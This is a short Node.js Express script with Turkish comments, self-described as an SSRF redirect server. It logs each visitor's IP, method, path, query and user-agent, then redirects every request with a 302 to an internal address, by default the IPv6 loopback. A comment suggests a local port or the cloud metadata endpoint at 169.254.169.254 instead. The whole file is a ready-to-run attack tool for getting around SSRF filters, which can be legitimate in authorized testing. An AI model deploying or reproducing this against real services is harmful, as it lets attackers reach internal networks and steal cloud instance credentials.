const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Yönlendirilecek hedef adres (Buraya iç ağ IP'si, portu veya test etmek istediğin yeri yazabilirsin)
// Örnek: 'http://127.0.0.1:8080/' veya 'http://169.254.169.254/latest/meta-data/'
const TARGET_URL = 'http://[::1]/'; 

// TÜM GELEN İSTEKLERİ YAKALAYAN VE YÖNLENDİREN MIDDLEWARE
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    const clientIp = req.headers['cf-connecting-ip'] || 
                     req.headers['x-forwarded-for'] || 
                     req.socket.remoteAddress;

    console.log('\n' + '='.repeat(60));
    console.log(`[${timestamp}] 📥 YENİ İSTEK YAKALANDI VE YÖNLENDİRİLİYOR!`);
    console.log(`🔹 IP Adresi     : ${clientIp}`);
    console.log(`🔹 HTTP Metod    : ${req.method}`);
    console.log(`🔹 İstek Yolu    : ${req.originalUrl}`);
    console.log(`🔹 Query Params  :`, req.query);
    console.log(`🔹 User-Agent    : ${req.headers['user-agent'] || 'Bilinmiyor'}`);
    console.log(`🔹 Hedef (Target): ${TARGET_URL}`);
    console.log('='.repeat(60) + '\n');

    // 302 Bulundu (Found) / Yönlendirme kodu ile hedef adrese fırlatıyoruz
    return res.redirect(302, TARGET_URL);
});

app.listen(PORT, () => {
    console.log(`SSRF Redirect Sunucusu aktif... 🚀 (Port: ${PORT})`);
});
